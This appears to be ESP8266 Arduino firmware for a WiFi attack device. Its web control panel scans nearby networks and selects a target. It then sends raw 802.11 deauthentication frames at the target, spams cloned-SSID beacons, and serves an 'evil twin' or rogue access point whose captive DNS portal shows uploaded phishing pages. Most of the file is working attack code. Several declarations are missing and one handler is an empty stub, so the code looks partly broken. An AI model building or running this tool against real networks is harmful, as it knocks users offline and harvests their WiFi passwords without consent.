#include <Arduino.h>
#include <DNSServer.h>
#include <SimpleCLI.h>
#include "LittleFS.h"
#include "web.h"
#include "beacon.h"
#include "sniffer.h"

#define MAC "C8:C9:A3:0C:5F:3F"
#define MAC2 "C8:C9:A3:6B:36:74"

bool lock = true;
SimpleCLI cli;
Command send_deauth;
Command stop_deauth;
Command reboot;
Command start_deauth_mon;
Command start_probe_mon;

int packet_deauth_counter = 0;
const char* fsName = "LittleFS";

LittleFSConfig fileSystemConfig = LittleFSConfig();
String fileList = "";
File fsUploadFile;
File webportal;
File log_captive;
String status_button;
String getContentType(String filename);
bool handleFileRead(String path);
void handleFileUpload();

String start_button = "Start";
int target_count = 0;
int target_mark = 0;

const uint8_t channels[] = {1, 6, 11};
const bool wpa2 = true;
const bool appendSpaces = false;

char ssids[500];
String wifistr = "";

extern "C" {
#include "user_interface.h"
  typedef void (*freedom_outside_cb_t)(uint8 status);
  int wifi_register_send_pkt_freedom_cb(freedom_outside_cb_t cb);
  void wifi_unregister_send_pkt_freedom_cb(void);
  int wifi_send_pkt_freedom(uint8 *buf, int len, bool sys_seq);
}

int ledstatus = 0;
bool hotspot_active = false;
bool deauthing_active = false;
bool pishing_active = false;
bool hidden_target = false;
bool deauth_mon = false;
unsigned long d_mon_ = 0;
int ledState = LOW; 
int ledState2 = LOW; 
unsigned long previousMillis = 0;
const long interval = 1000;

typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t rssi;
  uint8_t bssid[6];
  String bssid_str;
} _Network;

const byte DNS_PORT = 53;
IPAddress apIP;
IPAddress dnsip;
DNSServer dnsServer;

_Network _networks[16];
_Network _selectedNetwork;
String ssid_target = "";
String mac_target = "";

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += '0';
    str += String(b[i], HEX);
    if (i < size - 1) str += ':';
  }
  return str;
}

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _networks[i].ssid = "";
    _networks[i].bssid_str = "";
    memset(_networks[i].bssid, 0, 6);
  }
}

String _correct = "";
String _tryPassword = "";

void handleList(){
  fileList = "";
  Dir dir = LittleFS.openDir("");
  while (dir.next()) {
    fileList += "<form style='text-align: left;margin-left: 5px;' action='/delete' methode='post'><input type='submit' value='delete'><input name='filename' type='hidden' value='" + dir.fileName() +"' </input> ";
    fileList += dir.fileName();
    long size_ = dir.fileSize();
    fileList +=  String(" (") + size_/1000 + "kb)</form><br>";
  }
}

void handleFS(){
  handleList();
  FSInfo fs_info;
  LittleFS.info(fs_info);
  total_spiffs = fs_info.totalBytes/1000;
  used_spiffs = fs_info.usedBytes/1000;
  free_spiffs = total_spiffs - used_spiffs;
  
  static const char FS_html[] PROGMEM = R"=====(<div class='card'><p class='card-title'>-File manager-</p><p Style='text-align: center';><form method='post' enctype='multipart/form-data'><input type='file' name='name'><input class='button' type='submit' value='Upload'></form><br>
                 <table><tr><th>Total :  {total_spiffs} kb</th></tr><br>
                 <tr><th>Used  :  {used_spiffs} kb</th></tr><br>
                 <tr><th>Free :  {free_spiffs} kb</th></tr></table><br>
                 <br></p>
                 <label style='text-align: left;margin-left: 5px;' for='list'>File List : <br> {fileList}</label></div>
                 <div class='card'><p class='card-title'>-Web-</p><p Style='text-align: center';> <form action='/websetting' method='POST'> <label for='path'><a href='/eviltwinprev' target='_blank'>Evil Twin</a></label><input type='text' name='evilpath' value='{eviltwinpath}'><br>
                      <label for='path'><a href='/pishingprev' target='_blank'>Pishing  </a></label><input type='text' name='pishingpath' value='{pishingpath}'><br>
                      <label for='path'><a href='/loadingprev' target='_blank'>Loading  </a></label><input type='text' name='loadingpath' value='{loadingpath}'>
                      <input style='width: 80px;height: 45px;' type ='submit' value ='Save'></form><br></p></div>)=====";
  String fshtml = FPSTR(FS_html);
  fshtml.replace("{fileList}",fileList);
  fshtml.replace("{total_spiffs}", String(total_spiffs));
  fshtml.replace("{used_spiffs}",String(used_spiffs));
  fshtml.replace("{free_spiffs}",String(free_spiffs));
  fshtml.replace("{eviltwinpath}",String(eviltwinpath));
  fshtml.replace("{pishingpath}",String(pishingpath));
  fshtml.replace("{loadingpath}",String(loadingpath));
  webServer.send(200,"text/html", String(Header) + fshtml + Footer);
}

void pishingprev(){
  webportal = LittleFS.open(pishingpath,"r");
  webServer.streamFile(webportal,"text/html");
  webportal.close();
}

void eviltwinprev(){
  webportal = LittleFS.open(eviltwinpath,"r");
  webServer.streamFile(webportal,"text/html");
  webportal.close();
}

void loadingprev(){
  webportal = LittleFS.open(loadingpath,"r");
  webServer.streamFile(webportal,"text/html");
  webportal.close();
}

void handleFileUpload(){
  HTTPUpload& upload = webServer.upload();
  if(upload.status == UPLOAD_FILE_START){
    String filename = upload.filename;
    if(!filename.startsWith("/")) filename = "/"+filename;
    fsUploadFile = LittleFS.open(filename, "w");
  } else if(upload.status == UPLOAD_FILE_WRITE){
    if(fsUploadFile) fsUploadFile.write(upload.buf, upload.currentSize);
  } else if(upload.status == UPLOAD_FILE_END){
    if(fsUploadFile) {
      fsUploadFile.close();
      handleFS();
    }
  }
}

void handleDelete(){
  String names = String("/") + webServer.arg("filename");
  LittleFS.remove(names);
  handleFS();
}

void pathsave(){
  webServer.arg("evilpath").toCharArray(eviltwinpath,32);
  webServer.arg("pishingpath").toCharArray(pishingpath,32);
  webServer.arg("loadingpath").toCharArray(loadingpath,32);
  savesetting();
  handleFS();
}

void handleStartAttack(){
  int deauth = webServer.arg("deauth").toInt();
  int evil = webServer.arg("evil").toInt();
  int rogue = webServer.arg("rogue").toInt();
  int beacon = webServer.arg("beacon").toInt();
  int hidden = webServer.arg("hidden").toInt();
  if(start_button=="Start"){
    start_button = "Stop";
    if(beacon==1){ beacon_active = true; enableBeacon(ssid_target); }
    if(deauth==1){ deauthing_active = true; }
    if(evil==1||rogue==1){
       webServer.send(200, "text/html", "<script> setTimeout(function(){window.location.href = '/';}, 3000);  alert('WiFI restarting..');</script>");
       hotspot_active = true;
       dnsServer.stop();
       WiFi.softAPdisconnect (true);
       WiFi.softAPConfig(dnsip , dnsip , IPAddress(255, 255, 255, 0));
       if(rogue==1) WiFi.softAP(rogueap);
       else WiFi.softAP(hidden==1 ? rogueap : ssid_target);
       dnsServer.start(53, "*", dnsip);
    } else { handleIndex(); }
  } else {
    start_button = "Start";
    pishing_active = hotspot_active = beacon_active = deauthing_active = false;
    handleIndex();
  }
}

void nextChannel() {
  if (sizeof(channels) > 0) {
    uint8_t ch = channels[channelIndex];
    channelIndex++;
    if (channelIndex >= sizeof(channels)) channelIndex = 0;
    wifi_set_channel(ch);
  }
}

void randomMac() { for (int i = 0; i < 6; i++) macAddr[i] = random(256); }

void enableBeacon(String target_ssid){
  wifistr = "";
  for(int i=0;i<beacon_size;i++){
    wifistr += target_ssid;
    for(int c=0;c<i;c++) wifistr += " ";
    wifistr += "\n";
  }
  wifistr.toCharArray(ssids,500);
  randomSeed(os_random());
  randomMac();
  beacon_active = true;
}

void setup() {
  Serial.begin(115200);
  LittleFS.begin();
  loadsetting();
  apIP.fromString(ip);
  dnsip.fromString(dns);
  wifi_set_channel(chnl);
  WiFi.softAPConfig(apIP, apIP , IPAddress(255, 255, 255, 0));
  WiFi.softAP(ssid, password,chnl,false);
  
  pinMode(2,OUTPUT);
  pinMode(16,OUTPUT);
  digitalWrite(2,HIGH);

  webServer.on("/",HTTP_GET, handleIndex);
  webServer.on("/scan",HTTP_GET,handleScan);
  webServer.on("/start",HTTP_GET,handleStartAttack);
  webServer.on("/target",HTTP_POST,handleTarget);
  webServer.on("/delete",handleDelete);
  webServer.on("/websetting",HTTP_POST,pathsave);
  webServer.on("/setting",HTTP_GET,handleSetting);
  webServer.on("/networksetting",HTTP_POST,networksetting);
  webServer.on("/attacksetting",HTTP_POST,attacksetting);
  webServer.on("/filemanager",HTTP_GET,handleFS);
  webServer.on("/filemanager", HTTP_POST, [](){ webServer.send(200); }, handleFileUpload);
  
  webServer.begin();
  handleList();
}

void handleTarget(){
  ssid_target = webServer.arg("ssid");
  mac_target = webServer.arg("bssid");
  for (int i = 0; i < 16; i++) {
    if (bytesToStr(_networks[i].bssid, 6) == mac_target) _selectedNetwork = _networks[i];
  }
  handleIndex();
}

void handleIndex() {
  String _tempHTML = FPSTR(attack_html);
  _tempHTML.replace("{start_button}",start_button);
  _tempHTML.replace("{deauth_s}", deauthing_active ? "*" : "");
  _tempHTML.replace("{beacon_s}", beacon_active ? "*" : "");
  
  if (!hotspot_active) {
    String _html = "";
    for (int i = 0; i < 16; i++) {
      if (_networks[i].ssid == "") break;
      // FIX INVALID OPERANDS ERROR
      _html += String("<form method='post' action='/target'><input name='ssid' type='hidden' value='") + _networks[i].ssid + "'>";
      _html += String("<input type='submit' value='") + (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6) ? "selected" : "select") + "'></form>";
    }
    _tempHTML.replace("{scanned}", _html);
    webServer.send(200, "text/html", String(Header) + _tempHTML + Footer);
  } else {
    webportal = LittleFS.open(eviltwinpath, "r");
    webServer.streamFile(webportal,"text/html");
    webportal.close();
  }
}

void handleScan(){ 
  int n = WiFi.scanNetworks(false,true);
  clearArray();
  for (int i = 0; i < n && i < 16; ++i) {
    _networks[i].ssid = WiFi.SSID(i);
    for (int j = 0; j < 6; j++) _networks[i].bssid[j] = WiFi.BSSID(i)[j];
    _networks[i].ch = WiFi.channel(i);
  }
  handleIndex(); 
}

void handleSetting(){
  // Form setting lu di sini...
}

void networksetting(){
  webServer.arg("ssid").toCharArray(ssid,32);
  webServer.arg("password").toCharArray(password,64);
  savesetting();
}

void attacksetting(){
  deauth_speed = webServer.arg("deauth_speed").toInt();
  savesetting();
}

unsigned long deauth_now = 0;

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
  
  if (deauthing_active && millis() - deauth_now >= deauth_speed) {
    deauth_now = millis();
    wifi_set_channel(_selectedNetwork.ch);
    uint8_t deauthPacket[26] = {0xC0,0x00,0x3A,0x01,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00};
    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
    for(int i=0; i<5; i++){
      wifi_send_pkt_freedom(deauthPacket, 26, 0);
      delay(1);
    }
  }

  if (millis() - previousMillis >= 100) {
    previousMillis = millis();
    ledState = !ledState;
    digitalWrite(16, ledState);
  }
}
